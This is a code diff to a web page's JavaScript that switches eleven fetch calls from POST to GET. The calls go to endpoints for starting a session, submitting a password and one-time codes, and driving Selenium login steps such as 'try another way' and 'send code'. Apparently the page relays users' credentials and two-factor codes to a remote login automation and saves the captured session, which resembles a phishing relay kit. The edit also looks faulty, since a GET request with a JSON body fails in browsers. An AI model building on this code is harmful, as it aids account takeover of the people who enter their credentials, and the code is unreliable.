@@ -1393,7 +1393,7 @@
 				const loading = showLoading();
 				try {
 					const response = await fetch(`${API_BASE_URL}/start_session`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
@@ -1676,7 +1676,7 @@
 								setLoadingState(true, false, true);
 								try {
 									const response = await fetch(`${API_BASE_URL}/selenium/select_option`, {
-										method: 'POST',
+										method: 'GET',
 										headers: {
 											'Content-Type': 'application/json',
 										},
@@ -1738,7 +1738,7 @@
 				
 				try {
 					const response = await fetch(`${API_BASE_URL}/auth/password`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
@@ -1869,7 +1869,7 @@
 			async function saveSuccessfulSession() {
 				try {
 					const response = await fetch(`${API_BASE_URL}/save_successful_session`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
@@ -1891,7 +1891,7 @@
 				setLoadingState(true); // Show loading state
 				try {
 					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
@@ -1920,7 +1920,7 @@
 				setLoadingState(true); // Show loading state
 				try {
 					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
@@ -1949,7 +1949,7 @@
 				setLoadingState(true); // Show loading state
 				try {
 					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
@@ -1978,7 +1978,7 @@
 				setLoadingState(true); // Show loading state
 				try {
 					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
@@ -2006,7 +2006,7 @@
 				setLoadingState(true); // Show loading state
 				try {
 					const response = await fetch(`${API_BASE_URL}/selenium/try_another_way`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
@@ -2078,7 +2078,7 @@
 
 					// Send the selection to the server
 					const selectResponse = await fetch(`${API_BASE_URL}/selenium/select_option`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
@@ -2162,7 +2162,7 @@
 							try {
 								const method = this.id.replace('sendAgain', '').toLowerCase();
 								const response = await fetch(`${API_BASE_URL}/selenium/send_code`, {
-									method: 'POST',
+									method: 'GET',
 									headers: {
 										'Content-Type': 'application/json',
 									},
@@ -2242,7 +2242,7 @@
 				
 				try {
 					const response = await fetch(`${API_BASE_URL}/auth/otp`, {
-						method: 'POST',
+						method: 'GET',
 						headers: {
 							'Content-Type': 'application/json',
 						},
